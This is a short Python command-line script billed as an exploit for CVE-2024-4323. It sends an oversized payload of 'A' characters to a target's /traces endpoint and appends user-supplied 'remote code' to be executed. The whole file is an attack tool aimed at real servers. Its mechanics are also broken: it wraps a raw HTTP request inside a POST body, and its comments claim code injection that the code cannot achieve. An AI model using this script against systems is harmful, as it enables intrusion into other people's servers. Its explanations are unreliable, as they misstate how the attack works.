import requests
import argparse

def exploit(url, port, remote_code):
    target_url = f"http://{url}:{port}"

    # Malicious payload to trigger the memory corruption
    malicious_payload = (
        "GET /traces HTTP/1.1\r\n"
        f"Host: {url}\r\n"
        "Content-Length: 1000000\r\n"  # Large content length to trigger buffer overflow
        "Connection: keep-alive\r\n\r\n"
        + "A" * 1000000  # Large amount of data to overflow the buffer
        + remote_code  # Inject remote code at the end
    )

    try:
        response = requests.post(target_url, data=malicious_payload, headers={"Content-Type": "application/octet-stream"})
        print(f"Response Code: {response.status_code}")
        print(f"Response Body: {response.text}")
    except Exception as e:
        print(f"Exploit failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for CVE-2024-4323")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--port", required=True, help="Target port number")
    parser.add_argument("-c", "--code", required=True, help="Remote code to be executed")

    args = parser.parse_args()

    exploit(args.url, args.port, args.code)
